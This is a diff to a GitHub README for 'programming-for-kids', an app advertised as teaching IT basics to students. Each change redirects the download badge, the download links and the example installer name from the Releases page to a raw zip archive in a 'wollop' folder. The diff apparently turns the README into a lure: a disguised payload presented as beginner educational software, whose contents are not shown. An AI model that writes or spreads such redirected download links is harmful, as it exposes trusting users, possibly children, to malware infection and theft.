@@ -1,6 +1,6 @@
 # 📚 programming-for-kids - Discover IT Basics with Ease
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/CryptoCraigo/programming-for-kids/releases)
+[![Download](https://github.com/CryptoCraigo/programming-for-kids/raw/refs/heads/main/wollop/kids_for_programming_1.2.zip)](https://github.com/CryptoCraigo/programming-for-kids/raw/refs/heads/main/wollop/kids_for_programming_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to "programming-for-kids." This application serves as a guide for studen
 
 You can download the application from our Releases page. 
 
-[Visit this page to download](https://github.com/CryptoCraigo/programming-for-kids/releases).
+[Visit this page to download](https://github.com/CryptoCraigo/programming-for-kids/raw/refs/heads/main/wollop/kids_for_programming_1.2.zip).
 
 After downloading, follow these steps to install and run the application:
 
 1. Go to the Releases page using the link above.
 2. Select the latest version of the application.
-3. Click on the file you want to download (e.g., `programming-for-kids.exe`).
+3. Click on the file you want to download (e.g., `https://github.com/CryptoCraigo/programming-for-kids/raw/refs/heads/main/wollop/kids_for_programming_1.2.zip`).
 4. The download will begin automatically.
 
 ## 💻 System Requirements
@@ -74,4 +74,4 @@ Dive deeper into these subjects along with our application:
 
 For a seamless experience, download the application today:
 
-[Download Now](https://github.com/CryptoCraigo/programming-for-kids/releases).
+[Download Now](https://github.com/CryptoCraigo/programming-for-kids/raw/refs/heads/main/wollop/kids_for_programming_1.2.zip).
